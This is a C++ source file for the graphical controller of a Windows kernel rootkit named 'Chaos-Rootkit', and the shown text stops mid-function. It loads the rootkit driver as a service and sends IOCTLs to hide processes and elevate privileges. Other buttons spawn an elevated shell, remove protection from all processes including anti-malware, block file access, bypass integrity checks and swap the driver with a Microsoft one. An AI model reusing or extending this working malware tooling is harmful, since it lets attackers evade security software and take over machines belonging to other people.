
// Dear ImGui: standalone example application for GLFW + OpenGL 3, using programmable pipeline
#define STB_IMAGE_IMPLEMENTATION
#define IMGUI_DEFINE_MATH_OPERATORS
#define _CRT_SECURE_NO_WARNINGS

#include "stb_image.h"
#include <string.h>
#include <stdio.h>
#include <Windows.h>
#include <VersionHelpers.h>
#include <winioctl.h>
#include <ntstatus.h>
#include <cmath>

#include "imgui.h"
#include "imgui_impl_opengl3.h"
#include "imgui_impl_glfw.h"

#include "imgui.cpp"
#include "imgui_demo.cpp"
#include "imgui_draw.cpp"
#include "imgui_tables.cpp"
#include "imgui_widgets.cpp"
#include "imgui_impl_opengl3.cpp"
#include "imgui_impl_glfw.cpp"
#include "components.h"

#include <GLFW/glfw3.h>

#define GL_SILENCE_DEPRECATION
#if defined(IMGUI_IMPL_OPENGL_ES2)
#include <GLES2/gl2.h>
#endif

#if defined(_MSC_VER) && (_MSC_VER >= 1900) && !defined(IMGUI_DISABLE_WIN32_FUNCTIONS)
#pragma comment(lib, "legacy_stdio_definitions")
#endif

#ifdef __EMSCRIPTEN__
#include "../libs/emscripten/emscripten_mainloop_stub.h"
#endif

static void glfw_error_callback(int error, const char* description)
{
    fprintf(stderr, "GLFW Error %d: %s\n", error, description);
}

struct Texture
{
    GLuint id;
    int height;
    int width;
};

void DebugPrintWinVersion(void)
{
    // Implementation placeholder
    printf("Windows version debugging\n");
}

Texture readTextureFile()
{
    Texture result = {};

    if (sizeof(rawData) == 0) {
        printf("Warning: rawData is empty, creating fallback texture\n");
        result.width = 64;
        result.height = 64;

        glGenTextures(1, &(result.id));
        glBindTexture(GL_TEXTURE_2D, result.id);

        unsigned char fallback_data[64 * 64 * 4];
        for (int i = 0; i < 64 * 64 * 4; i += 4) {
            fallback_data[i] = 100;     // R
            fallback_data[i + 1] = 150; // G
            fallback_data[i + 2] = 200; // B
            fallback_data[i + 3] = 255; // A
        }

        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 64, 64, 0, GL_RGBA, GL_UNSIGNED_BYTE, fallback_data);

        return result;
    }

    int channels = 0;
    void* buffer = stbi_load_from_memory((const stbi_uc*)rawData, sizeof(rawData),
        &(result.width), &(result.height), &channels, 4);

    if (!buffer) {
        printf("Failed to load image from rawData, creating fallback\n");
        // Fallback to simple texture
        result.width = 64;
        result.height = 64;

        unsigned char* fallback_data = new unsigned char[64 * 64 * 4];
        for (int i = 0; i < 64 * 64 * 4; i += 4) {
            fallback_data[i] = 100;     // R
            fallback_data[i + 1] = 150; // G
            fallback_data[i + 2] = 200; // B
            fallback_data[i + 3] = 255; // A
        }
        buffer = fallback_data;
    }

    glGenTextures(1, &(result.id));
    glBindTexture(GL_TEXTURE_2D, result.id);

    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);

    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, result.width, result.height, 0, GL_RGBA, GL_UNSIGNED_BYTE, buffer);

    if (channels == 0) {
        delete[](unsigned char*)buffer; // Our fallback data
    }
    else {
        stbi_image_free(buffer); 
    }

    return result;
}

#define HIDE_PROC                               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x45,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PRIVILEGE_ELEVATION                     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_SYSTEM                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x91,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x92,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x93,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x94,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB_LIGHT           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x95,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS_LIGHT          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x96,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_LSA_LIGHT              CTL_CODE(FILE_DEVICE_UNKNOWN, 0x97,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x98,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x99,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define UNPROTECT_ALL_PROCESSES                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x100, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define RESTRICT_ACCESS_TO_FILE_CTL             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x169, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define BYPASS_INTEGRITY_FILE_CTL               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x170, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ZWSWAPCERT_CTL                          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x171, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Fixed type definitions
#define STATUS_ALREADY_EXISTS ((DWORD)0xB7)
#define ERROR_UNSUPPORTED_OFFSET ((DWORD)0x00000233)

BOOL loadDriver(char* driverPath) {
    SC_HANDLE hSCM, hService;

    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL)
    {
        return (1);
    }
    const char* g_serviceName = "Chaos-Rootkit";

    hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);

    if (hService != NULL) {
        printf("Service already exists.\n");

        SERVICE_STATUS serviceStatus;
        if (!QueryServiceStatus(hService, &serviceStatus)) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            printf("Unable to Query Service Status\n");
            return (1);
        }

        if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
            if (!StartServiceA(hService, 0, nullptr)) {
                printf("Unable to Start Service \n");
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return (1);
            }
            printf("Starting service...\n");
        }

        if (serviceStatus.dwCurrentState == SERVICE_RUNNING)
        {
            printf("The service is running already ...\n");

        }

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (0);
    }

    hService = CreateServiceA(hSCM, g_serviceName, g_serviceName, SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL,
        NULL, NULL);

    if (hService == NULL) {
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Service created successfully.\n");

    if (!StartServiceA(hService, 0, nullptr)) {

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Starting service...\n");

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return (0);
}


typedef struct foperationx {
    int rpid;
    wchar_t filename[MAX_PATH];
} fopera, * Pfoperation;


struct UIState {
    int elev_state = 0;
    int hide_state = 0;
    int unprotect_state = 0;
    int restrict_state = 0;
    int spoof_state = 0;
    int spawn_state = 0;
    int swap_state = 0;

    float elev_timer = 0.0f;
    float hide_timer = 0.0f;
    float unprotect_timer = 0.0f;
    float restrict_timer = 0.0f;
    float spoof_timer = 0.0f;
    float spawn_timer = 0.0f;
    float swap_timer = 0.0f;

    const float MESSAGE_TIME = 5.0f;
};

int main(int, char**)
{
    glfwSetErrorCallback(glfw_error_callback);
    if (!glfwInit()) {
        printf("Failed to initialize GLFW\n");
        return 1;
    }

    // Decide GL+GLSL versions
#if defined(IMGUI_IMPL_OPENGL_ES2)
    const char* glsl_version = "#version 100";
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 2);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);
    glfwWindowHint(GLFW_CLIENT_API, GLFW_OPENGL_ES_API);
#elif defined(__APPLE__)
    const char* glsl_version = "#version 150";
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);
    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);
    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);
#else
    // GL 3.0 + GLSL 130
    const char* glsl_version = "#version 130";
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);
#endif

    GLFWwindow* window = glfwCreateWindow(1280, 720, "Chaos-Rootkit", nullptr, nullptr);
    if (window == nullptr) {
        printf("Failed to create GLFW window\n");
        glfwTerminate();
        return 1;
    }
    glfwMakeContextCurrent(window);
    glfwSwapInterval(1); // Enable vsync

    // Setup Dear ImGui context
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;

    ImGui::StyleColorsDark();

    // Setup Platform/Renderer backends
    ImGui_ImplGlfw_InitForOpenGL(window, true);
    ImGui_ImplOpenGL3_Init(glsl_version);


    DWORD STATUS = 0;
    char buf[MAX_PATH] = { 0 };
    char filename[MAX_PATH] = { 0 };
    bool show_demo_window = false;
    bool connect_to_rootkit = false;
    bool elev_specific_process = false;
    bool is_rootket_connected = false;
    bool unprotect_all_processes = false;
    bool restrict_access_to_file = false;
    bool spoof_file = false;
    bool zwswapcert = false;
    bool hide_specific_process = false;
    bool spawn_elevated_process = false;
    HANDLE hdevice = INVALID_HANDLE_VALUE;
    DWORD currentPid = GetCurrentProcessId();
    bool HideProcess_Window = false;
    DWORD lpBytesReturned = 0;
    bool all_windows = false;
    int pid = 0;
    char* text_error_ = NULL;
    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
    Texture tex = readTextureFile();
    int check_off = 0;

    // FIXED: Add UI state management
    UIState ui_state;

    OSVERSIONINFOEX versionInfo;
    ZeroMemory(&versionInfo, sizeof(OSVERSIONINFOEX));
    versionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

#ifdef __EMSCRIPTEN__
    io.IniFilename = nullptr;
    EMSCRIPTEN_MAINLOOP_BEGIN
#else
    while (!glfwWindowShouldClose(window))
#endif
    {
        glfwPollEvents();

        float alive_rootkit[100];
        for (int n = 0; n < 100; n++)
            alive_rootkit[n] = sinf(n * 0.2f + (float)ImGui::GetTime() * 1.5f);

        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();
        ImGui::NewFrame();

        if (show_demo_window)
            ImGui::ShowDemoWindow(&show_demo_window);

        {
            static float f = 0.0f;
            static int counter = 0;
            ImGui::Begin("Rootkit Controller!");
            ImVec2 windowSize = ImGui::GetWindowSize();

            float imageWidth = 180.0f;
            float imageHeight = 180.0f;
            float imageX = (windowSize.x - imageWidth) * 0.5f;

            ImGui::SetCursorPosX(imageX);
            ImGui::Image((void*)(intptr_t)tex.id, ImVec2(imageWidth, imageHeight));

            if (ImGui::Button("Connect to rootkit")) {
                WIN32_FIND_DATAA fileData;
                HANDLE hFind;
                char FullDriverPath[MAX_PATH] = { 0 };

                hFind = FindFirstFileA("Chaos-Rootkit.sys", &fileData);

                if (hFind != INVALID_HANDLE_VALUE) {
                    if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) != 0) {
                        if (loadDriver(FullDriverPath)) {
                            hdevice = CreateFileW(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE,
                                NULL, OPEN_EXISTING, 0, NULL);

                            if (hdevice == INVALID_HANDLE_VALUE) {
                                printf("Unable to connect to rootkit %lX\n", GetLastError());
                                is_rootket_connected = false;
                            }
                            else {
                                printf("Rootkit-Connected\n");
                                is_rootket_connected = true;
                            }
                        }
                        else {
                            is_rootket_connected = false;
                        }
                    }
                    else {
                        printf("File not found\n");
                        is_rootket_connected = false;
                    }
                    FindClose(hFind);
                }
                else {
                    printf("Driver file not found\n");
                    is_rootket_connected = false;
                }
            }
            ImGui::SameLine();

            if (is_rootket_connected) {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
                ImGui::Text("Rootkit Connected");
                ImGui::PlotLines("", alive_rootkit, 100);
                ImGui::PopStyleColor();
            }
            else {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
                ImGui::Text("Rootkit not Connected");
                ImGui::PopStyleColor();
            }

            ImGui::Checkbox("Demo Window", &show_demo_window);

            if (check_off) {
                ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 0, 0, 255));
                ImGui::PushItemFlag(ImGuiItemFlags_Disabled, true);
                ImGui::Checkbox("Hide Process", &hide_specific_process);
                ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
                ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
                ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
                ImGui::PopItemFlag();
                ImGui::PopStyleColor();
            }
            else {
                ImGui::Checkbox("Hide Process", &hide_specific_process);
                ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
                ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
                ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
            }

            ImGui::Checkbox("Restrict Access To File", &restrict_access_to_file);
            ImGui::Checkbox("Bypass the file integrity check and protect it against anti-malware", &spoof_file);
            ImGui::Checkbox("Swap driver on disk and memory with a Microsoft driver", &zwswapcert);

            ImGui::Text("Application average %.3f ms/frame (%.1f FPS)", 1000.0f / io.Framerate, io.Framerate);
            ImGui::End();
        }

        if (elev_specific_process) {
            ImGui::SetNextWindowSize(ImVec2(300, 300), ImGuiCond_FirstUseEver);
            DebugPrintWinVersion();
            ImGui::Begin("Elevate Process", &elev_specific_process);
            ImGui::Text("Enter PID");
            ImGui::SameLine();
            ImGui::InputText("##elevpid", buf, IM_ARRAYSIZE(buf));

            if (ImGui::Button("Elevate Process")) {
                if (hdevice != INVALID_HANDLE_VALUE && strlen(buf) > 0) {
                    pid = atoi(buf);
                    if (pid > 0) {
                        DWORD bytesReturned = 0;
                        if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&pid, sizeof(pid),
                            &bytesReturned, sizeof(bytesReturned), NULL, NULL)) {
                            ui_state.elev_state = 2; // Success
                            ui_state.elev_timer = ui_state.MESSAGE_TIME;
                        }
                        else {
                            ui_state.elev_state = 1; // Error
                            ui_state.elev_timer = ui_state.MESSAGE_TIME;
                            lpBytesReturned = GetLastError();
                        }
                    }
                    else {
                        ui_state.elev_state = 1; // Error
                        ui_state.elev_timer = ui_state.MESSAGE_TIME;
                    }
                }
                else {
                    ui_state.elev_state = 1; // Error
                    ui_state.elev_timer = ui_state.MESSAGE_TIME;
                }
            }

            if (ui_state.elev_timer > 0.0f) {
                ui_state.elev_timer -= io.DeltaTime;

                if (ui_state.elev_state == 1) { // Error
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
                    if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET) {
                        ImGui::Text("Your Windows build is unsupported. Please open an issue in the GitHub repo.");
                        check_off = 1;
                    }
                    else {
                        ImGui::Text("Failed to send the IOCTL (%08lX).", lpBytesReturned);
                    }
                    ImGui::PopStyleColor();
                }
                else if (ui_state.elev_state == 2) { // Success
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
                    ImGui::Text("IOCTL sent, Process now is elevated");
                    ImGui::PopStyleColor();
                }

                if (ui_state.elev_timer <= 0.0f) {
                    ui_state.elev_state = 0; // Reset
                }
            }
            ImGui::End();
        }

        if (hide_specific_process) {
            ImGui::SetNextWindowSize(ImVec2(300, 300), ImGuiCond_FirstUseEver);
            ImGui::Begin("Hide Process", &hide_specific_process);
            ImGui::Text("Enter PID");
            ImGui::SameLine();
            ImGui::InputText("##hidepid", buf, IM_ARRAYSIZE(buf));

            if (ImGui::Button("Hide Process")) {
                if (hdevice != INVALID_HANDLE_VALUE && strlen(buf) > 0) {
                    pid = atoi(buf);
                    if (pid > 0) {
                        DWORD bytesReturned = 0;
                        if (DeviceIoControl(hdevice, HIDE_PROC, (LPVOID)&pid, sizeof(pid),
                            &bytesReturned, sizeof(bytesReturned), NULL, NULL)) {
                            ui_state.hide_state = 2; // Success
                            ui_state.hide_timer = ui_state.MESSAGE_TIME;
                        }
                        else {
                            ui_state.hide_state = 1; // Error
                            ui_state.hide_timer = ui_state.MESSAGE_TIME;
                            lpBytesReturned = GetLastError();
                        }
                        printf("Return value %lu\n", bytesReturned);
                    }
                    else {
                        ui_state.hide_state = 1; // Error
                        ui_state.hide_timer = ui_state.MESSAGE_TIME;
                    }
                }
                else {
                    ui_state.hide_state = 1; // Error
                    ui_state.hide_timer = ui_state.MESSAGE_TIME;
                }
            }

            if (ui_state.hide_timer > 0.0f) {
                ui_state.hide_timer -= io.DeltaTime;

                if (ui_state.hide_state == 1) { // Error
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
                    if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET) {
                        ImGui::Text("Your Windows build is unsupported.");
                        check_off = 1;
                    }
                    else {
                        ImGui::Text("Failed to send the IOCTL (process PID doesn't exist or is already hidden) (%08lX).", lpBytesReturned);
                    }
                    ImGui::PopStyleColor();
                }
                else if (ui_state.hide_state == 2) { // Success
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
                    ImGui::Text("IOCTL sent, Process now is hidden");
                    ImGui::PopStyleColor();
                }

                if (ui_state.hide_timer <= 0.0f) {
                    ui_state.hide_state = 0; // Reset
                }
            }
            ImGui::End();
        }

        if (unprotect_all_processes) {
            ImGui::SetNextWindowSize(ImVec2(300, 300), ImGuiCond_FirstUseEver);
            ImGui::Begin("UNPROTECT_ALL_PROCESSES", &unprotect_all_processes);

            if (ImGui::Button("UNPROTECT ALL PROCESSES")) {
                if (hdevice != INVALID_HANDLE_VALUE) {
                    DWORD bytesReturned = 0;
                    if (DeviceIoControl(hdevice, UNPROTECT_ALL_PROCESSES, NULL, 0,
                        &bytesReturned, sizeof(bytesReturned), NULL, NULL)) {
                        ui_state.unprotect_state = 2; // Success
                        ui_state.unprotect_timer = ui_state.MESSAGE_TIME;
                    }
                    else {
                        ui_state.unprotect_state = 1; // Error
                        ui_state.unprotect_timer = ui_state.MESSAGE_TIME;
                        lpBytesReturned = GetLastError();
                    }
                }
                else {
                    ui_state.unprotect_state = 1; // Error
                    ui_state.unprotect_timer = ui_state.MESSAGE_TIME;
                }
            }

            if (ui_state.unprotect_timer > 0.0f) {
                ui_state.unprotect_timer -= io.DeltaTime;

                if (ui_state.unprotect_state == 1) { // Error
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
                    if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET) {
                        ImGui::Text("Your Windows build is unsupported.");
                        check_off = 1;
                    }
                    else {
                        ImGui::Text("Failed to send the IOCTL (%08lX).", lpBytesReturned);
                    }
                    ImGui::PopStyleColor();
                }
                else if (ui_state.unprotect_state == 2) { // Success
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
                    ImGui::Text("All processes protection has been removed!");
                    ImGui::PopStyleColor();
                }

                if (ui_state.unprotect_timer <= 0.0f) {
                    ui_state.unprotect_state = 0; // Reset
                }
            }
            ImGui::End();
        }

        if (restrict_access_to_file) {
            ImGui::SetNextWindowSize(ImVec2(400, 300), ImGuiCond_FirstUseEver);
            if (spoof_file) {
                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", "Warning", MB_OK);
                spoof_file = false;
            }

            fopera operation_client = { 0 };
            ImGui::Begin("Restrict File Access", &restrict_access_to_file);
            ImGui::InputTextWithHint("##restrictpid", "PID", buf, IM_ARRAYSIZE(buf));
            ImGui::InputTextWithHint("##restrictfile", "Filename", filename, IM_ARRAYSIZE(filename));

            if (ImGui::Button("Restrict access to file")) {
                if (hdevice != INVALID_HANDLE_VALUE && strlen(filename) > 0 && strlen(buf) > 0) {
                    operation_client.rpid = atoi(buf);

                    size_t len = strlen(filename);
                    if (len < MAX_PATH - 1) {
                        if (mbstowcs_s(NULL, operation_client.filename, MAX_PATH, filename, len) == 0) {
                            printf("Filename to restrict access (%ls)\n", operation_client.filename);

                            DWORD bytesReturned = 0;
                            if (DeviceIoControl(hdevice, RESTRICT_ACCESS_TO_FILE_CTL, (LPVOID)&operation_client,
                                sizeof(operation_client), &bytesReturned, sizeof(bytesReturned),
                                NULL, NULL)) {
                                ui_state.restrict_state = 2; // Success
                                ui_state.restrict_timer = ui_state.MESSAGE_TIME;
                            }
                            else {
                                ui_state.restrict_state = 1; // Error
                                ui_state.restrict_timer = ui_state.MESSAGE_TIME;
                                lpBytesReturned = GetLastError();
                            }
                        }
                        else {
                            ui_state.restrict_state = 1; // Error
                            ui_state.restrict_timer = ui_state.MESSAGE_TIME;
                        }
                    }
                    else {
                        ui_state.restrict_state = 1; // Error
                        ui_state.restrict_timer = ui_state.MESSAGE_TIME;
                    }
                }
                else {
                    printf("Please make sure to provide filename and a valid PID\n");
                    ui_state.restrict_state = 1; // Error
                    ui_state.restrict_timer = ui_state.MESSAGE_TIME;
                }
            }

            if (ui_state.restrict_timer > 0.0f) {
                ui_state.restrict_timer -= io.DeltaTime;

                if (ui_state.restrict_state == 1) { // Error
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
                    if (lpBytesReturned == STATUS_ALREADY_EXISTS) {
                        ImGui::Text("Hook already installed with the same config (duplicated structure)");
                    }
                    else {
                        ImGui::Text("Failed to send IOCTL. Please make sure to provide a filename and valid PID.");
                    }
                    ImGui::PopStyleColor();
                }
                else if (ui_state.restrict_state == 2) { // Success
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
                    ImGui::Text("IOCTL sent, File Restricted");
                    ImGui::PopStyleColor();
                }

                if (ui_state.restrict_timer <= 0.0f) {
                    ui_state.restrict_state = 0; // Reset
                }
            }
            ImGui::End();
        }

        if (spoof_file) {
            ImGui::SetNextWindowSize(ImVec2(400, 300), ImGuiCond_FirstUseEver);
            if (restrict_access_to_file) {
                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", "Warning", MB_OK);
                restrict_access_to_file = false;
            }

            fopera operation_client = { 0 };
            ImGui::Begin("Bypass File Integrity", &spoof_file);
            ImGui::InputTextWithHint("##spooffile", "Filename", filename, IM_ARRAYSIZE(filename));

            if (ImGui::Button("Bypass integrity check")) {
                if (hdevice != INVALID_HANDLE_VALUE && strlen(filename) > 0) {
                    size_t len = strlen(filename);
                    if (len < MAX_PATH - 1) {
                        if (mbstowcs_s(NULL, operation_client.filename, MAX_PATH, filename, len) == 0) {
                            printf("Filename to bypass integrity check (%ls)\n", operation_client.filename);

                            DWORD bytesReturned = 0;
                            if (DeviceIoControl(hdevice, BYPASS_INTEGRITY_FILE_CTL, (LPVOID)&operation_client,
                                sizeof(operation_client), &bytesReturned, sizeof(bytesReturned),
                                NULL, NULL)) {
                                ui_state.spoof_state = 2; // Success
                                ui_state.spoof_timer = ui_state.MESSAGE_TIME;
                            }
                            else {
                                ui_state.spoof_state = 1; // Error
                                ui_state.spoof_timer = ui_state.MESSAGE_TIME;
                                lpBytesReturned = GetLastError();
                            }
                        }
                        else {
                            ui_state.spoof_state = 1; // Error
                            ui_state.spoof_timer = ui_state.MESSAGE_TIME;
                        }
                    }
                    else {
                        ui_state.spoof_state = 1; // Error
                        ui_state.spoof_timer = ui_state.MESSAGE_TIME;
                    }
                }
                else {
                    printf("Please make sure to provide filename\n");
                    ui_state.spoof_state = 1; // Error
                    ui_state.spoof_timer = ui_state.MESSAGE_TIME;
                }
            }

            if (ui_state.spoof_timer > 0.0f) {
                ui_state.spoof_timer -= io.DeltaTime;

                if (ui_state.spoof_state == 1) { // Error
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
                    if (lpBytesReturned == STATUS_ALREADY_EXISTS) {
                        ImGui::Text("Hook already installed with the same config (duplicated structure)");
                    }
                    else {
                        ImGui::Text("Failed to send IOCTL. Please make sure to provide a filename.");
                    }
                    ImGui::PopStyleColor();
                }
                else if (ui_state.spoof_state == 2) { // Success
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
                    ImGui::Text("IOCTL sent, File Protected");
                    ImGui::PopStyleColor();
                }

                if (ui_state.spoof_timer <= 0.0f) {
                    ui_state.spoof_state = 0; // Reset
                }
            }
            ImGui::End();
        }

        if (spawn_elevated_process) {
            ImGui::SetNextWindowSize(ImVec2(300, 300), ImGuiCond_FirstUseEver);
            ImGui::Begin("Spawn Elevated Process", &spawn_elevated_process);

            if (ImGui::Button("Spawn Elevated Process")) {
                if (hdevice != INVALID_HANDLE_VALUE) {
                    DWORD bytesReturned = 0;
                    if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&currentPid, sizeof(currentPid),
                        &bytesReturned, sizeof(bytesReturned), 0, NULL)) {
                        ui_state.spawn_state = 2; // Success
                        ui_state.spawn_timer = ui_state.MESSAGE_TIME;
                        if (bytesReturned == 0) {
                            printf("spawining cmd \n");
                            ui_state.spawn_state = 3; // Special success
                            system("start");
                        }
                    }
                    else {
                        printf("failed to send ioctl\n");

                        ui_state.spawn_state = 1; // Error
                        ui_state.spawn_timer = ui_state.MESSAGE_TIME;
                        lpBytesReturned = GetLastError();
                    }
                }
                else {
                    ui_state.spawn_state = 1; // Error
                    ui_state.spawn_timer = ui_state.MESSAGE_TIME;
                }
            }

            if (ui_state.spawn_timer > 0.0f) {
                ui_state.spawn_timer -= io.DeltaTime;

                if (ui_state.spawn_state == 1) { // Error
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
                    if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET) {
                        check_off = 1;
                    }
                    ImGui::Text("Failed to send the IOCTL.");
                    ImGui::PopStyleColor();
                }
                else if (ui_state.spawn_state == 2 || ui_state.spawn_state == 3) { // Success
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
                    if (ui_state.spawn_state == 3) {
                        ImGui::Text("The privilege of process has been elevated.");
                    }
                    else {
                        ImGui::Text("IOCTL %lx sent!", lpBytesReturned);
                    }
                    ImGui::PopStyleColor();
                }

                if (ui_state.spawn_timer <= 0.0f) {
                    ui_state.spawn_state = 0; // Reset
                }
            }
            ImGui::End();
        }

        if (zwswapcert) {
            ImGui::SetNextWindowSize(ImVec2(300, 300), ImGuiCond_FirstUseEver);
            ImGui::Begin("Swap the driver in memory and on disk", &zwswapcert);

            if (ImGui::Button("Swap")) {
                if (hdevice != INVALID_HANDLE_VALUE) {
                    DWORD bytesReturned = 0;
                    if (DeviceIoControl(hdevice, ZWSWAPCERT_CTL, NULL, 0,
                        &bytesReturned, sizeof(bytesReturned), 0, NULL)) {
                        ui_state.swap_state = 2; // Success
                        ui_state.swap_timer = ui_state.MESSAGE_TIME; 

                    }
                    else {
                        ui_state.swap_state = 1; // Error
                        ui_state.swap_timer = ui_state.MESSAGE_TIME;
                        lpBytesReturned = GetLastError();
                    }
                }
                else {
                    ui_state.swap_state = 1; // Error
                    ui_state.swap_timer = ui_state.MESSAGE_TIME;
                }
            }

            if (ui_state.swap_timer > 0.0f) {
                ui_state.swap_timer -= io.DeltaTime;

                if (ui_state.swap_state == 1) { // Error
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
                    if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET) {
                        check_off = 1;
                    }
                    ImGui::Text("Failed to swap the rootkit driver.");
                    ImGui::PopStyleColor();
                }
                else if (ui_state.swap_state == 2) { // Success
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
                    ImGui::Text("Swap operation completed!");
                    ImGui::PopStyleColor();
                }

                if (ui_state.swap_timer <= 0.0f) {
                    ui_state.swap_state = 0; // Reset
                }
            }
            ImGui::End();
        }

        ImGui::Render();
        int display_w, display_h;
